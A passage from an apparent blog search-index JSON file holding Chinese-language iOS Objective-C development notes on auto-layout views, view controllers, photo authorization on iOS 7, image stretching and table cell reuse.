(nonatomic, strong) NSLayoutConstraint *leftViewLeftSpaceConstraint; @property (nonatomic, strong) NSLayoutConstraint *leftViewRightSpaceConstraint; // @property (nonatomic, strong) NSLayoutConstraint *rightViewWidthConstraint; @property (nonatomic, strong) NSLayoutConstraint *rightViewHeightConstraint; @property (nonatomic, strong) NSLayoutConstraint *rightViewLeftSpaceConstraint; @property (nonatomic, strong) NSLayoutConstraint *rightViewRightSpaceConstraint; // @property (nonatomic, strong) NSLayoutConstraint *middleViewLeftEdgeConstraint; @property (nonatomic, strong) NSLayoutConstraint *middleViewRightEdgeConstraint; @end @implementation SharedView - (instancetype)initWithCoder:(NSCoder *)aDecoder &#123; self = [super initWithCoder:aDecoder]; if (self) &#123; _views = [NSMutableDictionary dictionary]; _constraints = [NSMutableArray array]; _leftViewWidth = 100; _leftViewHeight = 44; _leftViewLeftSpace = 0; _leftViewRightSpace = 0; _rightViewWidth = 100; _rightViewHeight = 44; _rightViewLeftSpace = 0; _rightViewRightSpace = 0; [self setButtomLineHidden:NO]; &#125; return self; &#125; - (instancetype)initWithFrame:(CGRect)frame &#123; self = [super initWithFrame:frame]; if (self) &#123; _views = [NSMutableDictionary dictionary]; _constraints = [NSMutableArray array]; _leftViewWidth = 100; _leftViewHeight = 44; _leftViewLeftSpace = 0; _leftViewRightSpace = 0; _rightViewWidth = 100; _rightViewHeight = 44; _rightViewLeftSpace = 0; _rightViewRightSpace = 0; [self setButtomLineHidden:NO]; &#125; return self; &#125; #pragma mark - Set Line - (void)setTopLineHidden:(BOOL)hidden &#123; if (_topLine) &#123; [_topLine setHidden:hidden]; &#125;else&#123; _topLine = [[UIView alloc]init]; [self addSubview:_topLine]; NSMutableArray *newConstraints = [NSMutableArray array]; // [_views setObject:_topLine forKey:@&quot;_topLine&quot;]; //Set autorizingMask [_topLine setTranslatesAutoresizingMaskIntoConstraints:NO]; //AutoLayout VF [newConstraints addObjectsFromArray:[NSLayoutConstraint constraintsWithVisualFormat:@&quot;H:|[_topLine]|&quot; options:0 metrics:nil views:_views]]; [newConstraints addObjectsFromArray:[NSLayoutConstraint constraintsWithVisualFormat:@&quot;V:|[_topLine(0.5)]&quot; options:0 metrics:nil views:_views]]; [self addConstraints:newConstraints]; [self layoutIfNeeded]; // [_topLine setBackgroundColor:COLOR_LINE]; [_topLine setHidden:hidden]; &#125; [self bringLineToFront]; &#125; - (void)setButtomLineHidden:(BOOL)hidden &#123; if (_buttomLine) &#123; [_buttomLine setHidden:hidden]; &#125;else &#123; _buttomLine = [[UIView alloc]init]; [self addSubview:_buttomLine]; NSMutableArray *newConstraints = [NSMutableArray array]; // [_views setObject:_buttomLine forKey:@&quot;_buttomLine&quot;]; //Set autorizingMask [_buttomLine setTranslatesAutoresizingMaskIntoConstraints:NO]; //AutoLayout VF [newConstraints addObjectsFromArray:[NSLayoutConstraint constraintsWithVisualFormat:@&quot;H:|[_buttomLine]|&quot; options:0 metrics:nil views:_views]]; [newConstraints addObjectsFromArray:[NSLayoutConstraint constraintsWithVisualFormat:@&quot;V:[_buttomLine(0.5)]|&quot; options:0 metrics:nil views:_views]]; [self addConstraints:newConstraints]; [self layoutIfNeeded]; // [_buttomLine setBackgroundColor:COLOR_LINE]; [_buttomLine setHidden:hidden]; &#125; [self bringLineToFront]; &#125; - (void)bringLineToFront &#123; if (_buttomLine) &#123; [self bringSubviewToFront:_buttomLine]; &#125; if (_topLine) &#123; [self bringSubviewToFront:_topLine]; &#125; &#125; #pragma mark - Set View - (void)setMiddleView:(UIView *)middleView &#123; _middleView = middleView; [self addSubview:_middleView]; NSMutableArray *newConstraints = [_constraints mutableCopy]; // [_views setObject:_middleView forKey:@&quot;_middleView&quot;]; // [_middleView setTranslatesAutoresizingMaskIntoConstraints:NO]; _middleViewLeftEdgeConstraint = [NSLayoutConstraint constraintWithItem:_middleView attribute:NSLayoutAttributeLeft relatedBy:NSLayoutRelationEqual toItem:self attribute:NSLayoutAttributeLeft multiplier:1.0 constant:0]; _middleViewRightEdgeConstraint = [NSLayoutConstraint constraintWithItem:_middleView attribute:NSLayoutAttributeRight relatedBy:NSLayoutRelationEqual toItem:self attribute:NSLayoutAttributeRight multiplier:1.0 constant:0]; [newConstraints addObject:_middleViewLeftEdgeConstraint]; [newConstraints addObject:_middleViewRightEdgeConstraint]; [newConstraints addObjectsFromArray:[NSLayoutConstraint constraintsWithVisualFormat:@&quot;V:|[_middleView]|&quot; options:0 metrics:nil views:_views]]; // [self removeConstraints:_constraints]; _constraints = [newConstraints mutableCopy]; [self addConstraints:_constraints]; [self layoutIfNeeded]; [self bringLineToFront]; &#125; - (void)setLeftView:(UIView *)leftView &#123; if (!_middleView) &#123; return; &#125;else &#123; _leftView = leftView; [self addSubview:_leftView]; NSMutableArray *newConstraints = [_constraints mutableCopy]; [_views setObject:_leftView forKey:@&quot;_leftView&quot;]; [_leftView setTranslatesAutoresizingMaskIntoConstraints:NO]; // [newConstraints addObjectsFromArray:[NSLayoutConstraint constraintsWithVisualFormat:@&quot;H:|-&gt;=0-[_leftView]-&gt;=0-[_middleView]&quot; options:NSLayoutFormatAlignAllCenterY metrics:nil views:_views]]; [newConstraints addObjectsFromArray:[NSLayoutConstraint constraintsWithVisualFormat:@&quot;V:|-&gt;=0-[_leftView]-&gt;=0-|&quot; options:0 metrics:nil views:_views]]; _leftViewWidthConstraint = [NSLayoutConstraint constraintWithItem:_leftView attribute:NSLayoutAttributeWidth relatedBy:NSLayoutRelationEqual toItem:nil attribute:NSLayoutAttributeNotAnAttribute multiplier:1.0 constant:_leftViewWidth]; _leftViewHeightConstraint = [NSLayoutConstraint constraintWithItem:_leftView attribute:NSLayoutAttributeHeight relatedBy:NSLayoutRelationLessThanOrEqual toItem:nil attribute:NSLayoutAttributeNotAnAttribute multiplier:1.0 constant:_leftViewHeight]; _leftViewLeftSpaceConstraint = [NSLayoutConstraint constraintWithItem:_leftView attribute:NSLayoutAttributeLeft relatedBy:NSLayoutRelationEqual toItem:self attribute:NSLayoutAttributeLeft multiplier:1.0 constant:_leftViewLeftSpace]; _leftViewRightSpaceConstraint = [NSLayoutConstraint constraintWithItem:_leftView attribute:NSLayoutAttributeRight relatedBy:NSLayoutRelationEqual toItem:_middleView attribute:NSLayoutAttributeLeft multiplier:1.0 constant:_leftViewRightSpace]; [newConstraints addObject:_leftViewHeightConstraint]; [newConstraints addObject:_leftViewWidthConstraint]; [newConstraints addObject:_leftViewLeftSpaceConstraint]; [newConstraints addObject:_leftViewRightSpaceConstraint]; [newConstraints removeObject:_middleViewLeftEdgeConstraint];//Remove old middleView [self removeConstraints:_constraints]; _constraints = [newConstraints mutableCopy]; [self addConstraints:_constraints]; [self layoutIfNeeded]; &#125; [self bringLineToFront]; &#125; - (void)setRightView:(UIView *)rightView &#123; if (!_middleView) &#123; return; &#125;else &#123; _rightView = rightView; [self addSubview:_rightView]; NSMutableArray *newConstraints = [_constraints mutableCopy]; [_views setObject:_rightView forKey:@&quot;_rightView&quot;]; [_rightView setTranslatesAutoresizingMaskIntoConstraints:NO]; // [newConstraints addObjectsFromArray:[NSLayoutConstraint constraintsWithVisualFormat:@&quot;H:[_middleView]-&gt;=0-[_rightView]-&gt;=0-|&quot; options:NSLayoutFormatAlignAllCenterY metrics:nil views:_views]]; [newConstraints addObjectsFromArray:[NSLayoutConstraint constraintsWithVisualFormat:@&quot;V:|-&gt;=0-[_rightView]-&gt;=0-|&quot; options:0 metrics:nil views:_views]]; _rightViewWidthConstraint =[NSLayoutConstraint constraintWithItem:_rightView attribute:NSLayoutAttributeWidth relatedBy:NSLayoutRelationEqual toItem:nil attribute:NSLayoutAttributeNotAnAttribute multiplier:1.0 constant:_rightViewWidth]; _rightViewHeightConstraint = [NSLayoutConstraint constraintWithItem:_rightView attribute:NSLayoutAttributeHeight relatedBy:NSLayoutRelationLessThanOrEqual toItem:nil attribute:NSLayoutAttributeNotAnAttribute multiplier:1.0 constant:_rightViewHeight]; _rightViewLeftSpaceConstraint = [NSLayoutConstraint constraintWithItem:_rightView attribute:NSLayoutAttributeLeft relatedBy:NSLayoutRelationEqual toItem:_middleView attribute:NSLayoutAttributeRight multiplier:1.0 constant: _rightViewLeftSpace]; _rightViewRightSpaceConstraint = [NSLayoutConstraint constraintWithItem:_rightView attribute:NSLayoutAttributeRight relatedBy:NSLayoutRelationEqual toItem:self attribute:NSLayoutAttributeRight multiplier:1.0 constant:_rightViewRightSpace]; // [newConstraints addObject:_rightViewWidthConstraint]; [newConstraints addObject:_rightViewHeightConstraint]; [newConstraints addObject:_rightViewLeftSpaceConstraint]; [newConstraints addObject:_rightViewRightSpaceConstraint]; [newConstraints removeObject:_middleViewRightEdgeConstraint];//Remove old middleView [self removeConstraints:_constraints]; _constraints = [newConstraints mutableCopy]; [self addConstraints:_constraints]; [self layoutIfNeeded]; &#125; [self bringLineToFront]; &#125; - (void)setLeftIconWithImage:(UIImage *)image &#123; UIImageView *leftImage = [[UIImageView alloc]initWithFrame:CGRectMake(0, 0, image.size.width, image.size.height)]; [leftImage setImage:image]; _leftViewWidth = image.size.width; _leftViewHeight = image.size.height; _leftViewLeftSpace = 10; _leftViewRightSpace = -10; [self setLeftView:leftImage]; &#125; - (void)setLeftLabelWithTitle:(NSString *)title &#123; UILabel *leftLabel = [[UILabel alloc]init]; [leftLabel setText:title]; [leftLabel setTextAlignment:NSTextAlignmentLeft]; [leftLabel setFont:[UIFont systemFontOfSize:16]]; _leftViewWidth = 60; _leftViewHeight = 44; [self setLeftView:leftLabel]; &#125; #pragma mark - Set Left View Frame - (void)setLeftViewWidth:(CGFloat)leftViewWidth &#123; _leftViewWidth = leftViewWidth; _leftViewWidthConstraint.constant = _leftViewWidth; [self layoutIfNeeded]; &#125; - (void)setLeftViewHeight:(CGFloat)leftViewHeight &#123; _leftViewHeight = leftViewHeight; NSLayoutConstraint *newConstraint = [NSLayoutConstraint constraintWithItem:_leftView attribute:NSLayoutAttributeHeight relatedBy:NSLayoutRelationEqual toItem:nil attribute:NSLayoutAttributeNotAnAttribute multiplier:1.0 constant:_leftViewHeight]; // [self removeConstraint:_leftViewHeightConstraint]; [_constraints removeObject:_leftViewHeightConstraint]; _rightViewHeightConstraint = newConstraint; [_constraints addObject:_leftViewHeightConstraint]; [self addConstraint:_leftViewHeightConstraint]; [self layoutIfNeeded]; &#125; - (void)setLeftViewLeftSpace:(CGFloat)leftViewLeftSpace &#123; _leftViewLeftSpace = leftViewLeftSpace; _leftViewLeftSpaceConstraint.constant = _leftViewLeftSpace; [self layoutIfNeeded]; &#125; - (void)setLeftViewRightSpace:(CGFloat)leftViewRightSpace &#123; _leftViewRightSpace = leftViewRightSpace; _leftViewRightSpaceConstraint.constant = -_leftViewRightSpace; [self layoutIfNeeded]; &#125; #pragma mark - Set Right View Frame - (void)setRightViewWidth:(CGFloat)rightViewWidth &#123; _rightViewWidth = rightViewWidth; _rightViewWidthConstraint.constant = _rightViewWidth; [self layoutIfNeeded]; &#125; - (void)setRightViewHeight:(CGFloat)rightViewHeight &#123; _rightViewHeight = rightViewHeight; NSLayoutConstraint *newConstraint = [NSLayoutConstraint constraintWithItem:_rightView attribute:NSLayoutAttributeHeight relatedBy:NSLayoutRelationEqual toItem:nil attribute:NSLayoutAttributeNotAnAttribute multiplier:1.0 constant:_rightViewHeight]; // [self removeConstraint:_rightViewHeightConstraint]; [_constraints removeObject:_rightViewHeightConstraint]; _rightViewHeightConstraint = newConstraint; [_constraints addObject:_rightViewHeightConstraint]; [self addConstraint:_rightViewHeightConstraint]; [self layoutIfNeeded]; &#125; - (void)setRightViewLeftSpace:(CGFloat)rightViewLeftSpace &#123; _rightViewLeftSpace = rightViewLeftSpace; _rightViewLeftSpaceConstraint.constant = _rightViewLeftSpace; [self layoutIfNeeded]; &#125; - (void)setRightViewRightSpace:(CGFloat)rightViewRightSpace &#123; _rightViewRightSpace = rightViewRightSpace; _rightViewRightSpaceConstraint.constant = -_rightViewRightSpace; [self layoutIfNeeded]; &#125; @end 还可以该进的地方不知道是不是可以用ViewContainer代替整个View,毕竟目前View和middleView功能重复,争取改的和TextField一样,可以左边右边加View","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"View","slug":"View","permalink":"http://yoursite.com/tags/View/"}]},{"title":"ChildViewController产生AlertView偏移的解决","date":"2016-01-07T15:00:00.000Z","path":"2016/01/08/ChildViewController产生AlertView偏移的解决/","text":"Window和View的关系因为Window是用来管理View的,所以Window上自然是可以AddSubView的.有些时候,我们会想在UIViewController上加一些自定的Alert窗口,比如网络请求的时候. 如果我把Alert添加到每个ViewController里,或者放在某个BaseViewController里,如果我把这个ViewController作为子ViewController加入到另一个ViewController里,就会产生AlertView的偏移.如图 如图所示,左边的才是想要的效果,右边的仅仅是白色的部分一个子ViewController里显示了Alert提示,所以产生了偏移. 两段代码有什么不同呢+ (instancetype)showHUDAddedTo:(UIView *)view animated:(BOOL)animated&#123; MBProgressHUD *hud = [[self alloc] initWithView:view]; hud.removeFromSuperViewOnHide = YES; [view addSubview:hud]; [hud show:animated]; return hud; &#125; 左边的使用KeyWindow调用 [self showHUDAddedTo:[UIApplication sharedApplication].keyWindow animated:animated]; 右边的使用的是某个UIViewController [self showHUDAddedTo:self.view animated:YES];","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"ViewController","slug":"ViewController","permalink":"http://yoursite.com/tags/ViewController/"}]},{"title":"获取TopMostViewController","date":"2016-01-07T15:00:00.000Z","path":"2016/01/08/获取TopMostViewController/","text":"判断当前窗口是否被加载了if (self.isViewLoaded &amp;&amp; self.view.window ) &#123; //Do Something &#125; 获取当前显示的ViewController因为所有的ViewController都在Window里,而App都是在KeyWindow上,所以可以用以下代码获得 - (UIViewController *)getCurrentVC &#123; //1. 先找到KeyWindow UIWindow * window = [[UIApplication sharedApplication] keyWindow]; //2. 正常情况下KeyWindow应该是在UIWindowLevelNormal,有Alert的时候KeyWindow就是Alert框 if (window.windowLevel != UIWindowLevelNormal) &#123; //3. 如果不是UIWindowLevelNormal,那么找到UIWindowLevelNormal级别的Window // 这里有个缺陷,因为UIWindowLevelNormal的不一定只有一个,虽然正常情况下只有一个 NSArray *windows = [[UIApplication sharedApplication] windows]; for(UIWindow * tmpWin in windows) &#123; if (tmpWin.windowLevel == UIWindowLevelNormal) &#123; //找到了UIWindowLevelNormal的Window window = tmpWin; break; &#125; &#125; &#125; //4. 判断RootViewController不是TabBarVC和NaviVC,且是ViewController id result = window.rootViewController; BOOL isViewController = ![result isKindOfClass:[UITabBarController class]] &amp;&amp; ![result isKindOfClass:[UINavigationController class]] &amp;&amp; [result isKindOfClass:[UIViewController class]]; //5. 进入递归循环,排除TabBarVC和NaviVC,以及进入PresentedVC继续递归 while (!isViewController) &#123; while ([result isKindOfClass:[UITabBarController class]]) &#123; UITabBarController *tempVC = result; result = [tempVC selectedViewController]; &#125; while ([result isKindOfClass:[UINavigationController class]]) &#123; UINavigationController *tempVC = result; result = [tempVC.viewControllers lastObject]; &#125; id presentedVC = [result presentedViewController]; if (presentedVC) &#123; result = presentedVC; &#125; isViewController = ![result isKindOfClass:[UITabBarController class]] &amp;&amp; ![result isKindOfClass:[UINavigationController class]] &amp;&amp; [result isKindOfClass:[UIViewController class]]; &#125; return result; &#125; 该代码是加入了有Presented的VC就查到presented的,如果去掉present检查,可以查到除去model ViewController的第一个","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"ViewController","slug":"ViewController","permalink":"http://yoursite.com/tags/ViewController/"}]},{"title":"BaseViewController和ViewController+Base的测试","date":"2016-01-06T15:00:00.000Z","path":"2016/01/07/BaseViewController和ViewController+Base的测试/","text":"ViewController的基类和基类目的讨论在分类学习的时候,学到一种思想是能用分类就不要用继承,这个想法对不对呢,经过BaseViewController的实践,我感觉这&lt;( ￣＾￣)&gt; 真是哲学(╬ Ò ‸ Ó)呢 BaseViewController有什么好BaseViewController的好处是一些公共样式或者私有属性可以放在基类里,调用更加方便,而且保证了我即使不键入任何一行代码,也能得到相同的初始化状态,即使有些初始化状态被更改了,进入新窗口还能改回来例如我的[BaseViewController和自定义返回键的小故事]笔记 ViewController+Base有什么好用分类管理公共函数,更加灵活,看起来更加原生态,而且分类函数的迁移和修改都更加方便,╮(╯_╰)╭ 总之就是看起来更加original. 坏处就是如果我想得到默认样式,BaseViewController里的viewDidLoad,每当加载一个新窗口都会自动重新调用一次,但是如果用了分类,我需要单独写个函数setBaseView,在每个窗口的viewDidLoad调用setBaseView 那我就是作死小能手,就想用分类如果实在作死,我想在分类里的setBaseView,就叫做viewDidLoad并且通过 [self viewDidLoad]; 调用,会发生什么呢. #import &quot;ViewController.h&quot; #import &quot;UIViewController+Base.h&quot; @implementation ViewController - (void)viewDidLoad &#123; [super viewDidLoad]; NSLog(@&quot;Begin ViewDidLoad&quot;); [self viewDidLoad]; NSLog(@&quot;End ViewDidLoad&quot;); &#125; @end 对应的Base分类是 @interface UIViewController (Base) - (void)viewDidLoad; @end #import &quot;UIViewController+Base.h&quot; @implementation UIViewController (Base) - (void)viewDidLoad &#123; NSLog(@&quot;BaseViewDidLoad&quot;); &#125; @end 作死的结果编译器会提示一个警告,但是不会报错 Category is implementing a method which will also be implemented by its primary class 并且**NSLog(@”End ViewDidLoad”)**这个函数永远不会被执行,程序进入死循环.～(￣▽￣～)(～￣▽￣)～ 所以结论是算了…还是老老实实用基类吧,不要强迫症了……","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"ViewController","slug":"ViewController","permalink":"http://yoursite.com/tags/ViewController/"}]},{"title":"BaseViewController和自定义返回键的小故事","date":"2016-01-06T15:00:00.000Z","path":"2016/01/07/BaseViewController和自定义返回键的小故事/","text":"ViewController基类应用开发的时候,总有一些ViewController是样式相同的,那么就可以给这些样式相同的ViewController创建一些基类,并且利用里面的viewDidLoad等函数完成一些重复的功能.出于自定义需求,我们还可以自定义一个LeftBarButtonItem. //BaseViewController.m #import &quot;BaseViewController.h&quot; @implementation BaseViewController - (void)popToPreview&#123; [self.navigationController popViewControllerAnimated:YES]; &#125; - (void)setLeftBarButtonItemTarget:(id)target action:(SEL)action&#123; //自定义一个返回键 UIButton *button = [UIButton buttonWithType:UIButtonTypeCustom]; UIImage *nImage = [UIImage resourceImageNamed:@&quot;btn_back_white&quot;]; [button setFrame:CGRectMake(0, 0, nImage.size.width, nImage.size.height)]; [button setBackgroundImage:nImage forState:UIControlStateNormal]; //自定义返回键功能 [button addTarget:target action:action forControlEvents:UIControlEventTouchUpInside]; //添加到NavigationBar上 UIBarButtonItem *barBtnItem = [[UIBarButtonItem alloc] initWithCustomView:button]; barBtnItem.style = UIBarButtonItemStylePlain; [self.navigationItem setLeftBarButtonItem:barBtnItem]; &#125; #pragma mark - View Life Cycle - (void)viewDidLoad&#123; [super viewDidLoad]; // Do any additional setup after loading the view. //自定义基类返回按键 [self setLeftBarButtonItemTarget:self action:@selector(popToPreview)]; //设置个背景色 self.view.backgroundColor = [UIColor whiteColor]; &#125; - (void)didReceiveMemoryWarning&#123; [super didReceiveMemoryWarning]; // Dispose of any resources that can be recreated. &#125; @end 子ViewController里换掉LeftBarButtonItem如果我在自ViewController里换掉了LeftBarButtonItem,那我push进入一个新的同样基类的ViewController,返回键是那种情况呢 @interface ViewControllerOne : BaseViewController @end @interface ViewControllerTwo : BaseViewController @end //ViewControllerOne.m - (void)viewDidLoad &#123; [super viewDidLoad]; // Do any additional setup after loading the view. [self setLeftBarButtonItemAsDismissBtn]; &#125; - (void)setLeftBarButtonItemAsDismissBtn &#123; UIButton *button = [UIButton buttonWithType:UIButtonTypeCustom]; UIImage *nImage = [UIImage resourceImageNamed:@&quot;btn_dismiss&quot;]; [button setFrame:CGRectMake(0, 0, nImage.size.width, nImage.size.height)]; [button setBackgroundImage:nImage forState:UIControlStateNormal]; // [button addTarget:self action:@selector(touchUpInsideDismissBtn:) forControlEvents:UIControlEventTouchUpInside]; // UIBarButtonItem *barBtnItem = [[UIBarButtonItem alloc] initWithCustomView:button]; barBtnItem.style = UIBarButtonItemStylePlain; [self.navigationItem setLeftBarButtonItem:barBtnItem]; &#125; - (void)pushToViewControllerTwo &#123; ViewControllerTwo *vc = [[ViewControllerTwo alloc]init]; [self.navigationController pushViewController:vc animated:YES]; &#125; 答案是,返回键仍然保持基类的样式,第一次我遇见的时候有个疑问既然navigationItem是共享的,为什么我换掉后ViewControllerTwo没有保持我替换后的LeftBarButtonItem呢 没有被替换的原因因为ViewControllerTwo进行init的时候,又从新调用了基类的ViewDidLoad把LeftBarButtonItem换回来了. //伪代码 //堆栈调用顺序 [ViewControllerOne viewDidLoad]; [ViewControllerOne setLeftBarButtonItemAsDismissBtn]; [ViewControllerOne pushToViewControllerTwo]; [[ViewControllerTwo alloc]init] [ViewControllerOne viewDidLoad]; [BaseViewController viewDidLoad]; [BaseViewController setLeftBarButtonItemTarget:self action:@selector(popToPreview)];","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"ViewController","slug":"ViewController","permalink":"http://yoursite.com/tags/ViewController/"}]},{"title":"OC中基本C类型的传值与传址","date":"2016-01-06T15:00:00.000Z","path":"2016/01/07/OC中基本C类型的传值与传址/","text":"OC中基本C类型的传值与传址OC中除了有自有的NSxxxx的数据类型,还继承了C语言的int,float,char,BOOL等等,那么这些数据类型在OC的函数中进行传递,是传址还是传值呢? 传址和传值的区别函数声明,第一个为传址,因为有”*”,第二个是传值. - (void)passAddress:(BOOL *)parameterOne value:(BOOL)parameterTwo; 调用方法 [self passAddress:&amp;parameterOne value:parameterTwo] 那么在函数内部修改parameterOne,那么函数外部的parameterOne是被修改掉的**[传址],函数内部修改parameterTwo的话,外部的parameterTwo并不会同时被修改[传值]**","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"}]},{"title":"响应者链条和Hit机制","date":"2016-01-06T15:00:00.000Z","path":"2016/01/07/响应者链条和Hit机制/","text":"哪个类来管理交互凡是继承UIResponder的类都可以响应交互,例如UIViewController和UIView 怎么响应继承于UIResponder的Object会加入一个叫响应者链的东西,然后在响应者链条里的才能响应交互. 响应者链条举例为什么ViewController里有childViewController,还要 [self.view addSubview:self.childViewController[0].view]; 是因为,如果只是在ViewController里init另一个ViewController然后添加它的view的话,仅仅能展示,不能交互.原因就是没有加入响应者链条,childViewController就是让内部的ViewController进入了响应者链条 响应如何触发简单来看,就是你的手指像一个子弹,从屏幕射入,透传下去,碰到的第一个在响应者链条里的Object就会触发交互,产生响应. 响应传递的实际原理原理参见盗图&lt;(≧▽≦)&gt;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Responder","slug":"Responder","permalink":"http://yoursite.com/tags/Responder/"}]},{"title":"系统AuthorizationStatus的IOS7大坑","date":"2016-01-06T15:00:00.000Z","path":"2016/01/07/系统AuthorizationStatus的IOS7-9大坑/","text":"判断的时候一定要写全4种情况以Photos模块为例,所有的授权都分四种 授权未决定(弹出框的状态)NotDetermined 授权受限Restricted,当前不能接入,并不是未授权,可能是因为家长控制等等原因不能访问,很少见 授权拒绝Denied,就是用户拒绝了 授权接入Authorized 一般默认枚举的状态都是未决定. typedef NS_ENUM(NSInteger, PHAuthorizationStatus) &#123; PHAuthorizationStatusNotDetermined = 0, // User has not yet made a choice with regards to this application PHAuthorizationStatusRestricted, // This application is not authorized to access photo data. // The user cannot change this application’s status, possibly due to active restrictions // such as parental controls being in place. PHAuthorizationStatusDenied, // User has explicitly denied this application access to photos data. PHAuthorizationStatusAuthorized // User has authorized this application to access photos data. &#125; NS_AVAILABLE_IOS(8_0); iOS7有什么大坑iOS7应用被安装上的时候从未打开的时候,在”设置-隐私-相册”里是看不到app的授权状态的,甚至没有该app的图标. 所以说如果用以下代码判断,会出现一个大坑 - (BOOL)requestForPhotoAuthorization &#123; //创建一个信号 dispatch_semaphore_t sema = dispatch_semaphore_create(0); __block BOOL result = FALSE; // ALAuthorizationStatus status = [ALAssetsLibrary authorizationStatus]; switch (status) &#123; case ALAuthorizationStatusAuthorized: result = TRUE; break; default: break; &#125; dispatch_semaphore_wait(sema, DISPATCH_TIME_FOREVER); return result; &#125; iOS7的情况下,还不能用Photos,用的是AssetLibrary,这里的大坑就是如果AssetLibrary如果没有探测到过ALAuthorizationStatusDenied,新应用在设置隐私里还是看不到app图标,此时程序通过requestForPhotoAuthorization去判断 - (void)tapGestureOnAlbumCell:(UITableViewCell *)cell &#123; if ([self requestForPhotoAuthorization]) &#123; //do something &#125;else &#123; [UIAlertView showWithMessage:@&quot;请在 设置-隐私-照片 打开访问允许&quot; delegate:nil]; &#125; &#125; 由于requestForPhotoAuthorization始终返回的是FALSE,会收到提醒去开放权限的Alert,但是去设置里又看不到App,造成了死循环,始终无法访问相册. 这尼玛太坑了&lt;(=┘￣Д￣)┘╧═╧ 如何解决大坑见第一条!一定要把四种状态全部做判断 - (BOOL)requestForPhotoAuthorization &#123; //创建一个信号 dispatch_semaphore_t sema = dispatch_semaphore_create(0); __block BOOL result = FALSE; // ALAuthorizationStatus status = [ALAssetsLibrary authorizationStatus]; switch (status) &#123; case ALAuthorizationStatusAuthorized: result = TRUE; break; case ALAuthorizationStatusRestricted: break; case ALAuthorizationStatusNotDetermined: break; case ALAuthorizationStatusDenied: break; default: break; &#125; dispatch_semaphore_wait(sema, DISPATCH_TIME_FOREVER); return result; &#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"AuthorizationStatus","slug":"AuthorizationStatus","permalink":"http://yoursite.com/tags/AuthorizationStatus/"}]},{"title":"Cell点中是否变色","date":"2016-01-05T15:00:00.000Z","path":"2016/01/06/Cell点中是否变灰色/","text":"Cell点中是否变色cell点中是否变灰色不是由UITableView控制的,是由Cell本身控制的 @property (nonatomic) UITableViewCellSelectionStyle selectionStyle; // default is UITableViewCellSelectionStyleBlue. 并且由该枚举控制 typedef NS_ENUM(NSInteger, UITableViewCellSelectionStyle) &#123; UITableViewCellSelectionStyleNone, UITableViewCellSelectionStyleBlue, UITableViewCellSelectionStyleGray, UITableViewCellSelectionStyleDefault NS_ENUM_AVAILABLE_IOS(7_0) &#125;;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"TableViewCell","slug":"TableViewCell","permalink":"http://yoursite.com/tags/TableViewCell/"}]},{"title":"把小图拉伸减少IPA体积","date":"2016-01-04T15:00:00.000Z","path":"2016/01/05/把小图拉伸减少IPA体积/","text":"图片大小和IPA体积 有一些切图可以通过切小图然后拉伸来用较小的素材完成界面效果,可以有效的减少IPA体积 对于PNG图片，由于它内部保存了额外的分层和透明通道信息，统称为EXIF，所以它会比JPG图片大一些。App开发推荐使用PNG图片是因为XCode会在打包时压缩PNG图片的大小。我们可以写一个脚本，在打包前，把PNG图片中这些多余的信息，删除掉。 如何对图片进行拉伸代码方式可以通过代码进行拉伸 // create a resizable version of this image. the interior is tiled when drawn. - (UIImage *)resizableImageWithCapInsets:(UIEdgeInsets)capInsets NS_AVAILABLE_IOS(5_0); // the interior is resized according to the resizingMod - (UIImage *)resizableImageWithCapInsets:(UIEdgeInsets)capInsets resizingMode:(UIImageResizingMode)resizingMode NS_AVAILABLE_IOS(6_0); 需要注意的是UIEdgeInsets，这是一结构体，包含 上／左／下／右四个参数。上左下右4参数定义了cap inset，就是离四条边的距离。拉伸时，cap到边的部分不会被拉伸，其余部分则会被拉伸.尤其需要注意的是，拉伸的时候左右和上下是独立进行的,并不是轮廓的直接放大 如上图所示,为什么第二行出现了两个箭头 拉伸的时候，是按前文说的两个方向来拉伸 拉伸的部分，是以tiled(铺地板)方式，简单的说就是以镜像的方式 按照1的规则，拉伸的时候，水平和垂直方向都分别拉伸。这样在水平拉伸的时候，箭头其实处于用于拉伸的部分。在拉伸的时候，先按照原有的尺寸添加进去，不足的地方再把中间不拉伸的部分填充进去，周而复始，直到填充完毕。因此，就有上面的现象了。 xcassets的方式如果用Xcaasets管理图片,那么拉伸可以用GUI的方式进行,如下图拉伸方式可以选择横向/双向/纵向三种,淡色的部分是需要被填充的部分,而第一和第二条卡尺线之间的深色的部分,则是被重复填充的镜像. 参考: [1] http://www.cnblogs.com/scorpiozj/p/3302270.html","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"}]},{"title":"Table的复用原理以及Cell的使用","date":"2016-01-03T15:00:00.000Z","path":"2016/01/04/Table的复用原理以及Cell的使用/","text":"TableView怎么用TableView中可以添加TableCell,而其主要通过两个协议进行Table的管理 &lt;UITableViewDataSource,UITableViewDelegate&gt;,可以通过阅读头文件详细了解 UITableViewDataSource该协议中的两个函数是Table管理Cell必须的,分别是Table有多少行和每行是什么Cell @required - (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section; - (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath; UITableViewDelegate这个协议中是主要定义了cell的选中功能函数,也包括一些其它optional功能,如果仅仅是展示性质的cell,可以不用用到 // Selection - (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath; TableView中Cell的复用TableView中cell的复用是十分十分重要的一个知识点,几乎所有面试都会问吧 什么叫复用就是我有100行cell,但是不可能一页(Screen的高度)显示完,那么我可以制造一种假象,仿佛我有100行,但是实际只有20行,每当用户进行滑动,我就把滑出屏幕的cell,重新拼接到屏幕下方,展示给用户 